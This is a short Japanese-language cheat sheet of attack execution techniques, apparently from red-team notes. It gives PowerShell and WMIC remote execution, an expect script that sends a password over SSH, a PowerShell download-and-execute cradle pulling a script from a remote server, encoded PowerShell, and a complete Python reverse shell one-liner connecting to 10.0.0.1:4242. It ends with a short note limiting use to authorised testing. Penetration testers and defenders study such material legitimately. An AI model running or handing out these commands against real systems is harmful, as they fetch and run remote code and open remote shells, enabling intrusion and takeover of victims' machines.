# Execution Techniques

## コマンドライン実行

### Windows コマンド実行
```powershell
# PowerShell リモート実行
Enter-PSSession -ComputerName <target>
Invoke-Command -ComputerName <target> -ScriptBlock {whoami}

# WMI を使用した実行
wmic /node:<target> process call create "cmd.exe /c command"
```

### Linux コマンド実行
```bash
# SSH 経由での実行
ssh user@target 'command'

# expect を使用した自動化
expect -c '
spawn ssh user@target
expect "password:"
send "password\r"
expect "$ "
send "command\r"
'
```

## スクリプト実行

### PowerShell スクリプト
```powershell
# メモリ上での実行
IEX (New-Object Net.WebClient).DownloadString('http://server/script.ps1')

# Base64 エンコードされたコマンド
powershell -enc <base64-encoded-command>
```

### Python スクリプト実行
```python
# リバースシェル
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## 注意事項
- これらのコマンドは、許可された環境でのテストにのみ使用してください
- システムに重大な影響を与える可能性があります
- 実行前に必ずコマンドの内容を確認してください 